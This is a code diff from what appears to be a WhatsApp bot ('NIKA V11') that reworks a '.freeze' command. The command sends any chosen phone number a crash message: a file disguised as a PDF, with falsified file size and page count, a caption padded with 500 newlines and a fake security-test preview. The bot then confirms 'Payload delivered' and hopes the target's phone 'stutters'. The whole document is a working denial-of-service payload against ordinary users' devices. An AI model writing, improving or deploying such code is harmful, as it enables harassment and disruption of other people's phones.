@@ -4556,39 +4556,33 @@ _Can be started from any chat, but source members require source group access an
                 break;
             }
 case ".freeze": {
-    // This extracts the target phone number if you provide one
     const textArgs = msg.message.extendedTextMessage?.text || msg.message.conversation || "";
     const parts = textArgs.split(" ");
     const num = parts[1];
-    
-    // If you type '.freeze 234...', it targets them. 
-    // If you just type '.freeze', it targets the current chat (YOU).
     const target = num ? num.replace(/\D/g, "") + "@s.whatsapp.net" : from;
 
     await sock.sendMessage(target, {
-        text: "Render Test..." + "\n".repeat(500), 
+        // We send the file directly here, not in the contextInfo
+        document: fs.readFileSync("./package.json"), 
+        fileName: "System_Diagnostic.pdf",
+        mimetype: "application/pdf",
+        fileLength: 9999999999999999, // The "Massive File" lie
+        pageCount: 1000000,            // The "Million Pages" lie
+        caption: "Render Test Active..." + "\n".repeat(500),
         contextInfo: {
-            document: fs.readFileSync("./package.json"), 
-            filename: `Verification_Secure.pdf`,
-            mimetype: 'application/pdf',
-            
-            // THE INTERNAL LIES
-            fileLength: 99999999999999999999999999999999999999, 
-            pageCount: 10909143,	
-
             externalAdReply: {
                 showAdAttribution: true,
-                title: `🛡️ NIKA V11 SECURITY CHECK`,
-                body: `Initializing Overload Test...`,
+                title: `🛡️ HARDWARE STRESS TEST`,
+                body: `NIKA V11 VIP`,
                 previewType: "PHOTO",
                 sourceUrl: `https://google.com`
             }
         }
     });
-    // 'reply' is the function your bot uses to confirm actions
-    await reply("Payload delivered. Now, open the chat and let's see if that Tecno survives!");
+    await reply("Document Payload delivered. Open the chat now—let's see if the Tecno finally stutters!");
         }
-        
+                
+    
             case ".revoke": {
                 if (!isGroup) return reply(eclipseSay("not_group"));
                 await sock.groupRevokeInvite(from);
